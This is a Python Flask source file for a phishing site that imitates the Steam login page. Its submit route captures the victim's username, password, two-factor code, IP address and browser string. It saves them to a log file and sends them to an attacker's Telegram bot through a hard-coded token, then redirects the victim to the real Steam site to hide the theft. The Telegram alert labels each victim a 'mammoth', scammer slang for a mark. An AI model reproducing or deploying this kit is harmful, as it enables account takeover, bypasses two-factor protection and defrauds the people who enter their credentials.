from flask import Flask, render_template, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# ============================================
# НАСТРОЙКИ
# ============================================
TELEGRAM_TOKEN = "9112788455:AAGqGaWjVd-mGJa6IZXGcuGD5UmmddjFme0"
TELEGRAM_CHAT_ID = "9247494433"
LOG_FILE = "logs.txt"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, data=params, timeout=10)
    except Exception as e:
        print(f"Ошибка отправки: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET'])
def login_page():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Сбор данных
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    username = request.form.get('username', '')
    password = request.form.get('password', '')
    twofactor = request.form.get('twofactor_code', '')

    # Формирование лога
    log_entry = (
        f"=================================\n"
        f"[{time_now}] | IP: {ip}\n"
        f"User-Agent: {user_agent}\n"
        f"Логин: {username}\n"
        f"Пароль: {password}\n"
        f"2FA: {twofactor}\n"
        f"=================================\n"
    )

    # Запись в файл
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

    # Отправка в Telegram
    tg_msg = (
        f"<b>🔥 НОВЫЙ МАМОНТ STEAM</b>\n\n"
        f"<b>Время:</b> {time_now}\n"
        f"<b>IP:</b> <code>{ip}</code>\n"
        f"<b>Логин:</b> {username}\n"
        f"<b>Пароль:</b> ||{password}||\n"
        f"<b>2FA:</b> {twofactor}\n\n"
        f"📁 <i>Лог сохранён на сервере.</i>"
    )
    send_telegram(tg_msg)

    # Редирект
    return redirect("https://steamcommunity.com/login/home/?goto=0")

if __name__ == '__main__':
    # Запуск на 5000 порту
   app.run(host="0.0.0.0", port=1084, debug=True)